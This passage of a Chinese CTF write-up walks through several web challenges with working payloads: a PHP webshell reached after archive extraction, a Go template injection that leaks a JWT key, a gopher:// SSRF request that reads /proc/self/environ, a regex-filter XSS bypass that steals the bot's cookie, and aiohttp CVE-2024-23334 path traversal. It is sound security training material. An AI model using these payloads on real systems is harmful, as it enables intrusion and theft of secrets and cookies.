<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/8.png" alt="alt text"></p>
<p>继续构造解压的请求，修改 action 即可，解压完的文件在 &#x2F;A&#x2F;exts</p>
<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/9.png" alt="alt text"></p>
<p>访问 &#x2F;A&#x2F;exts&#x2F;shell.php，可以直接进行命令执行</p>
<blockquote>
<p>这里的路径文件名就是上面下载的压缩包里面的文件，如果压缩包里有多个文件，解压会在 exts 下建立一个和上面 POST 参数 filepath 的值一致的文件夹，php 马需要在此目录下访问</p>
</blockquote>
<p><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/10.png" alt="alt text"></p>
<p>flag 在根目录下的 &#x2F;flllllag 文件，用通配符读取即可（如 &#x2F;fl*）</p>
<h2 id="PangBai-过家家（4）"><a href="#PangBai-过家家（4）" class="headerlink" title="PangBai 过家家（4）"></a>PangBai 过家家（4）</h2><p>根据题目附件所给的 hint，只需关注 main.go 文件即可，文件中定义了一个静态文件路由和三个路由：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/&quot;</span>, routeIndex)</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/eye&quot;</span>, routeEye)</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/favorite&quot;</span>, routeFavorite)</span><br></pre></td></tr></table></figure>

<p>在 main.go 的 routeEye 函数中发现了 tmpl.Execute 函数，通过分析，我们重点关注下面的代码片段：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tmplStr := strings.Replace(<span class="type">string</span>(content), <span class="string">&quot;%s&quot;</span>, input, <span class="number">-1</span>)</span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;eye&quot;</span>).Parse(tmplStr)</span><br><span class="line"></span><br><span class="line">helper := Helper&#123;User: user, Config: config&#125;</span><br><span class="line">err = tmpl.Execute(w, helper)</span><br></pre></td></tr></table></figure>

<p>我们的输入 input 会直接作为模板字符串的一部分，与 Python 的 SSTI 类似，我们可以使用 <code>&#123;&#123; &#125;&#125;</code> 来获取上下文中的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GoLang 模板中的上下文</span><br><span class="line">tmpl.Execute 函数用于将 tmpl 对象中的模板字符串进行渲染，第一个参数传入的是一个 Writer 对象，后面是一个上下文，在模板字符串中，可以使用 &#123;&#123; . &#125;&#125; 获取整个上下文，或使用 &#123;&#123; .A.B &#125;&#125; 进行层级访问。若上下文中含有函数，也支持 &#123;&#123; .Func &quot;param&quot; &#125;&#125; 的方式传入变量。并且还支持管道符运算。</span><br><span class="line">在本题中，由于 utils.go 定义的 Stringer 对象中的 String 方法，对继承他的每一个 struct，在转换为字符串时都会返回 [struct]，所以直接使用 &#123;&#123; . &#125;&#125; 返回全局的上下文结构会返回 [struct].</span><br></pre></td></tr></table></figure>

<p>访问 &#x2F;eye 路由，默认就是 <code>&#123;&#123; .User &#125;&#125;</code> 和返回的信息。根据上面代码片段的内容，我们追溯 Helper 和 Config 两个结构体的结构：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Helper <span class="keyword">struct</span> &#123;</span><br><span class="line">    Stringer</span><br><span class="line">    User   <span class="type">string</span></span><br><span class="line">    Config Config</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = Config&#123;</span><br><span class="line">    Name:          <span class="string">&quot;PangBai 过家家 (4)&quot;</span>,</span><br><span class="line">    JwtKey:        RandString(<span class="number">64</span>),</span><br><span class="line">    SignaturePath: <span class="string">&quot;./sign.txt&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以泄露出 JWT 的密钥，只需输入 <code>&#123;&#123; .Config.JwtKey &#125;&#125;</code> 即可：<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/11.png" alt="alt text"></p>
<p>然后我们关注另一个路由 &#x2F;favorite：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">routeFavorite</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.Method == http.MethodPut &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ensure only localhost can access</span></span><br><span class="line">        requestIP := r.RemoteAddr[:strings.LastIndex(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)]</span><br><span class="line">        fmt.Println(<span class="string">&quot;Request IP:&quot;</span>, requestIP)</span><br><span class="line">        <span class="keyword">if</span> requestIP != <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; requestIP != <span class="string">&quot;[::1]&quot;</span> &#123;</span><br><span class="line">            w.WriteHeader(http.StatusForbidden)</span><br><span class="line">            w.Write([]<span class="type">byte</span>(<span class="string">&quot;Only localhost can access&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        token, _ := r.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"></span><br><span class="line">        o, err := validateJwt(token.Value)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            w.Write([]<span class="type">byte</span>(err.Error()))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> o.Name == <span class="string">&quot;PangBai&quot;</span> &#123;</span><br><span class="line">            w.WriteHeader(http.StatusAccepted)</span><br><span class="line">            w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello, PangBai!&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> o.Name != <span class="string">&quot;Papa&quot;</span> &#123;</span><br><span class="line">            w.WriteHeader(http.StatusForbidden)</span><br><span class="line">            w.Write([]<span class="type">byte</span>(<span class="string">&quot;You cannot access!&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body, err := ioutil.ReadAll(r.Body)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            http.Error(w, <span class="string">&quot;error&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">        &#125;</span><br><span class="line">        config.SignaturePath = <span class="type">string</span>(body)</span><br><span class="line">        w.WriteHeader(http.StatusOK)</span><br><span class="line">        w.Write([]<span class="type">byte</span>(<span class="string">&quot;ok&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render</span></span><br><span class="line"></span><br><span class="line">    tmpl, err := template.ParseFiles(<span class="string">&quot;views/favorite.html&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(w, <span class="string">&quot;error&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sig, err := ioutil.ReadFile(config.SignaturePath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(w, <span class="string">&quot;Failed to read signature files: &quot;</span>+config.SignaturePath, http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = tmpl.Execute(w, <span class="type">string</span>(sig))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(w, <span class="string">&quot;[error]&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 &#x2F;favorite 路由下，网页右下角的内容实际上是一个文件读的结果，文件路径默认为 config.SignaturePath 即 .&#x2F;sign.txt 的内容。</p>
<p>而如果使用 PUT 请求，则可以修改 config.SignaturePath 的值，但需要携带使 Name（Token 对象中是 Name 字段，但是 JWT 对象中是 user 字段，可以在 utils.go 中的 validateJwt 函数中看到）为 Papa 的 JWT Cookie.</p>
<p>于是就有了解题思路：利用泄露的 JwtKey 伪造 Cookie，对 &#x2F;favorite 发起 PUT 请求以修改 config.SignaturePath，然后访问 &#x2F;favorite 获取文件读的内容。</p>
<p>然而 &#x2F;favorite 中又强制要求请求必须来自于本地。</p>
<p>注意到下面的代码片段：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Helper)</span></span> Curl(url <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Curl:&quot;</span>, url)</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-fsSL&quot;</span>, <span class="string">&quot;--&quot;</span>, url)</span><br><span class="line">    _, err := cmd.CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Error: curl:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码为 Helper 定义了一个 Curl 的方法，所以我们可以在 &#x2F;eye 路由下通过 <code>&#123;&#123; .Curl "url" &#125;&#125;</code> 调用到这个方法，这个方法允许我们在服务端发起内网请求，即 SSRF（服务端请求伪造）：<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/12.png" alt="alt text"></p>
<p>由于 <code>exec.Command</code> 中 <code>--</code> 的存在，我们没有办法进行任何命令注入或选项控制。而一般情况下，在没有其它参数指定时，curl 发起的 HTTP 请求也只能发送 GET 请求，题目要求的是 PUT 请求。</p>
<p>但 curl 命令并不是只能发起 HTTP 请求，它也支持其它很多的协议，例如 FTP、Gopher 等，其中 Gopher 协议能满足我们的要求。</p>
<blockquote>
<p>Gopher 协议是一个互联网早期的协议，可以直接发送任意 TCP 报文。其 URI 格式为：gopher:&#x2F;&#x2F;远程地址&#x2F;_编码的报文，表示将报文原始内容发送到远程地址.</p>
</blockquote>
<p>我们先签一个 JWT：<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/13.png" alt="alt text"></p>
<p>然后构造 PUT 请求原始报文，Body 内容为想要读取的文件内容，这里读取环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUT /favorite HTTP/1.1</span><br><span class="line">Host: localhost:8000</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiUGFwYSJ9.tgAEnWZJGTa1_HIBlUQj8nzRs2M9asoWZ-JYAQuV0N0</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">/proc/self/environ</span><br></pre></td></tr></table></figure>

<p>tips：必须填正确 Content-Length 的值，以使报文接收方正确解析 HTTP Body 的内容，并且 Body 不应当包含换行符，否则读文件会失败。</p>
<p>对请求进行编码和套上 Gopher 协议<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/14.png" alt="alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:8000/_PUT%20%2Ffavorite%20HTTP%2F1%2E1%0D%0AHost%3A%20localhost%3A8000%0D%0AContent%2DType%3A%20text%2Fplain%0D%0ACookie%3A%20token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9%2EeyJ1c2VyIjoiUGFwYSJ9%2EtgAEnWZJGTa1%5FHIBlUQj8nzRs2M9asoWZ%2DJYAQuV0N0%0D%0AContent%2DLength%3A%2018%0D%0A%0D%0A%2Fproc%2Fself%2Fenviron</span><br></pre></td></tr></table></figure>
<p>注意用burp发包时对上面的payload还要进行一次urlencode</p>
<p>然后调用 curl，在 &#x2F;eye 路由访问 <code>&#123;&#123; .Curl "gopher://..." &#125;&#125;</code> 即可。</p>
<p>然后访问 &#x2F;favorite 路由即可得到 FLAG</p>
<h2 id="PangBai-过家家（5）"><a href="#PangBai-过家家（5）" class="headerlink" title="PangBai 过家家（5）"></a>PangBai 过家家（5）</h2><p>题目有一个发件的路由，还有一个查看信件的路由，以及一个「提醒 PangBai」的按钮，这个按钮实际就是让 Bot 访问查看当前信件的路由。</p>
<p>我们要做的就是找到一处能够展示我们的输入的地方，想办法使内容展示之后，浏览器能够执行我们恶意的 JavaScript 代码。这样，如果让 Bot 去访问这个 URL，恶意代码就会在 Bot 的浏览器执行，我们的恶意代码可以执行获取 Cookie 等操作。</p>
<p>从 bot.ts 可见，FLAG 在 Cookie 中：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">  <span class="attr">value</span>: process.<span class="property">env</span>[<span class="string">&quot;FLAG&quot;</span>] || <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>,</span><br><span class="line">  <span class="attr">httpOnly</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">  <span class="attr">domain</span>: <span class="string">&quot;localhost:3000&quot;</span>,</span><br><span class="line">  <span class="attr">sameSite</span>: <span class="string">&quot;Strict&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们直接输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 做测试，访问查看信件的界面，查看源码，发现输入被过滤了。</p>
<p>跟踪附件中的后端源码，page.ts 中的 &#x2F;box&#x2F;:id 路由，会渲染我们的输入：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/box/:id&quot;</span>, <span class="title function_">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> letter = <span class="title class_">Memory</span>.<span class="title function_">get</span>(ctx.<span class="property">params</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line">  <span class="keyword">await</span> ctx.<span class="title function_">render</span>(<span class="string">&quot;letter&quot;</span>, &lt;<span class="title class_">TmplProps</span>&gt;&#123;</span><br><span class="line">    <span class="attr">page_title</span>: <span class="string">&quot;PangBai 过家家 (5)&quot;</span>,</span><br><span class="line">    <span class="attr">sub_title</span>: <span class="string">&quot;查看信件&quot;</span>,</span><br><span class="line">    <span class="attr">id</span>: ctx.<span class="property">params</span>[<span class="string">&quot;id&quot;</span>],</span><br><span class="line">    <span class="attr">hint_text</span>: <span class="variable constant_">HINT_LETTERS</span>[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable constant_">HINT_LETTERS</span>.<span class="property">length</span>)],</span><br><span class="line">    <span class="attr">data</span>: letter</span><br><span class="line">      ? &#123;</span><br><span class="line">          <span class="attr">title</span>: <span class="title function_">safe_html</span>(letter.<span class="property">title</span>),</span><br><span class="line">          <span class="attr">content</span>: <span class="title function_">safe_html</span>(letter.<span class="property">content</span>),</span><br><span class="line">        &#125;</span><br><span class="line">      : &#123; <span class="attr">title</span>: <span class="variable constant_">TITLE_EMPTY</span>, <span class="attr">content</span>: <span class="variable constant_">CONTENT_EMPTY</span> &#125;,</span><br><span class="line">    <span class="attr">error</span>: letter ? <span class="literal">null</span> : <span class="string">&quot;找不到该信件&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是输入的内容都经过了 safe_html 过滤</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">safe_html</span>(<span class="params"><span class="attr">str</span>: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> str</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/&lt;.*&gt;/gim</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/&lt;\.*&gt;/gim</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/&lt;.*&gt;.*&lt;\/.*&gt;/gim</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见这只是一个正则替换，正则中各个标志的作用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i 标志：忽略大小写</span><br><span class="line">g 标志：全局匹配，找到所有符合条件的内容</span><br><span class="line">m 标志：多行匹配，每次匹配时按行进行匹配，而不是对整个字符串进行匹配（与之对应的是 s 标志，表示单行模式，将换行符看作字符串中的普通字符）</span><br></pre></td></tr></table></figure>
<p>由于 m 的存在，匹配开始为行首，匹配结束为行尾，因此我们只需要把 &lt; 和 &gt; 放在不同行即可，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>此时我们就能执行恶意代码了。直接使用 document.cookie 即可获取到 Bot 的 Cookie。 拿到 Cookie 之后，怎么回显呢？如果题目靶机是出网的，可以发送到自己的服务器上面；但是题目靶机并不出网，这时可以写一个 JavaScript 代码，模拟用户操作，将 Cookie 作为一个信件的内容提交（让 Bot 写信），这样我们就能查看到了。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">&gt;</span><br><span class="line">fetch(&#x27;/api/send&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;&#x27;title&#x27;: &quot;Cookie&quot;, &#x27;content&#x27;: document.cookie&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>fetch 中的请求路径可以是相对路径、绝对路径等，因此上面忽略了 Origin，如果显示指定，必须和当前的 Origin 一样，否则存在跨域问题。从 bot.ts 中可以看到 Bot 访问的是 <code>http://localhost:3000</code>，因此使用 <code>http://127.0.0.1:3000</code> 是不行的。</p>
<p>把 Payload 提交之后，如果手动查看信件并点击「提醒 PangBai」，会触发两次 Payload，一次是你自己查看信件时触发的，一次是 Bot 触发的。</p>
<p>提交并「提醒 PangBai」之后，稍等一会，查看信箱，就可以看到内容了。</p>
<h2 id="臭皮的网站"><a href="#臭皮的网站" class="headerlink" title="臭皮的网站"></a>臭皮的网站</h2><p>网站是 aiohttp 框架的，网上搜一搜相关的 CVE，了解到 CVE-2024-23334.</p>
<p>存在任意文件读取：<br><img src="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/15.png" alt="alt text"></p>
<p>可以读取到源代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> aiohttp_session <span class="keyword">import</span> setup <span class="keyword">as</span> session_setup, get_session</span><br><span class="line"><span class="keyword">from</span> aiohttp_session.cookie_storage <span class="keyword">import</span> EncryptedCookieStorage</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line"><span class="comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp_session cryptography</span></span><br><span class="line"><span class="comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp==3.9.1</span></span><br><span class="line"></span><br><span class="line">adminname = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreteKey</span>():</span><br><span class="line">    key_bytes = secrets.token_bytes(<span class="number">32</span>)</span><br><span class="line">    key_str = base64.urlsafe_b64encode(key_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">if</span> username == adminname <span class="keyword">and</span> password ==<span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">middleware</span>(<span class="params">app, handler</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">middleware_handler</span>(<span class="params">request</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = <span class="keyword">await</span> handler(request)</span><br><span class="line">            response.headers[<span class="string">&#x27;Server&#x27;</span>] = <span class="string">&#x27;nginx/114.5.14&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">except</span> web.HTTPNotFound:</span><br><span class="line">            response = <span class="keyword">await</span> handler_404(request)</span><br><span class="line">            response.headers[<span class="string">&#x27;Server&#x27;</span>] = <span class="string">&#x27;nginx/114.5.14&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            response = <span class="keyword">await</span> handler_500(request)</span><br><span class="line">            response.headers[<span class="string">&#x27;Server&#x27;</span>] = <span class="string">&#x27;nginx/114.5.14&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> middleware_handler</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> web.FileResponse(<span class="string">&#x27;./template/404.html&#x27;</span>, status=<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_500</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> web.FileResponse(<span class="string">&#x27;./template/500.html&#x27;</span>, 